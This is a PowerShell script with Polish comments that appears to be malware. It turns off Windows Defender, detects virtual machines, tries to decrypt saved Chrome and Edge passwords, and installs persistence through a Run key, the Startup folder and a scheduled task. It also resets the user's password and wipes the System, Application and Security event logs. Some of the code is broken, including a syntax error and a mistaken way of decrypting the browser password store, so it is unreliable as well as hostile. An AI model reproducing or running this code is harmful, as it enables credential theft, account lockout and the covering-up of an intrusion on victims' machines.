# Natychmiastowe wyłączenie Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
    Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
} catch {
    # Awaryjne wyłączenie przez usunięcie klucza rejestru
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force
}
#region Mechanizmy Ochronne
# Wykrywanie środowisk wirtualnych
$isVM = $false
$vmIndicators = @(
    (Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*",
    (Get-WmiObject Win32_BIOS).SerialNumber -like "*VMware*",
    (Get-WmiObject Win32_BaseBoard).Product -eq "Virtual Machine",
    (Get-Process -Name vm* -ErrorAction SilentlyContinue) -ne $null
)
if ($vmIndicators -contains $true) {
    $isVM = $true
    Write-Output "[!] Wykryto środowisko wirtualne" | Out-File "E:\vm_detection.log" -Append
}

# Walidacja uprawnień administratora
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent])
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Wymagane uprawnienia administratora"
}

#region Główna Logika
try {
    # Tymczasowe wyłączenie Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    $originalDefenderSettings = Get-MpPreference

    # Tworzenie zabezpieczonego pliku z danymi systemowymi
    $systemData = systeminfo /FO CSV | ConvertFrom-Csv
    $secureFilePath = "E:\SecureSystemData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
    $systemData | ConvertTo-Json | ConvertTo-SecureString -AsPlainText -Force | 
        ConvertFrom-SecureString | Out-File $secureFilePath
    attrib +s +h $secureFilePath

    # Ekstrakcja danych przeglądarek
    $browsers = @('Chrome', 'MicrosoftEdge', 'Mozilla')
    $results = @()
    
    foreach ($browser in $browsers) {
        $dataPath = switch ($browser) {
            'Chrome' { "$env:LOCALAPPDATA\Google\Chrome\User Data" }
            'MicrosoftEdge' { "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
            'Mozilla' { "$env:APPDATA\Mozilla\Firefox\Profiles" }
        }
        
        if (Test-Path $dataPath) {
            $browserData = @{
                Browser = $browser
                Passwords = @()
                Cookies = @()
                History = @()
            }
            
            # Logika ekstrakcji (przykład dla Chrome/Edge)
            if ($browser -in 'Chrome', 'MicrosoftEdge') {
                $loginDataPath = Join-Path $dataPath "Default\Login Data"
                if (Test-Path $loginDataPath) {
                    # Odszyfrowanie DPAPI
                    $encryptedBytes = [System.IO.File]::ReadAllBytes($loginDataPath)
                    $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedBytes, 
                        $null, 
                        [Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    $browserData['Passwords'] = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                }
            }
            $results += $browserData
        }
    }
    $results | ConvertTo-Json -Depth 3 | Out-File "E:\BrowserData_$(Get-Date -Format 'yyyyMMdd').json"

    # Rejestracja autostartu w 3 lokalizacjach
    $persistenceMethods = @(
        { New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate" -Value "powershell -File `"E:\payload.ps1`"" -Force },
        { Copy-Item $MyInvocation.MyCommand.Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force },
        { 
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"E:\payload.ps1`""
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemMonitor" -Force 
        }
    )
    foreach ($method in $persistenceMethods) {
        try { & $method } catch { Write-Error $_ }
    }

    # Bezpieczna zmiana hasła użytkownika
    $newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    Set-LocalUser -Name $user -Password $newPassword

    # Czyszczenie dzienników
    wevtutil cl System
    wevtutil cl Application
    wevtutil cl Security
    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
finally {
    # Przywrócenie ustawień Defender
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    if ($originalDefenderSettings) {
        Set-MpPreference -DisableRealtimeMonitoring $originalDefenderSettings.DisableRealtimeMonitoring
    }
}
#endregion
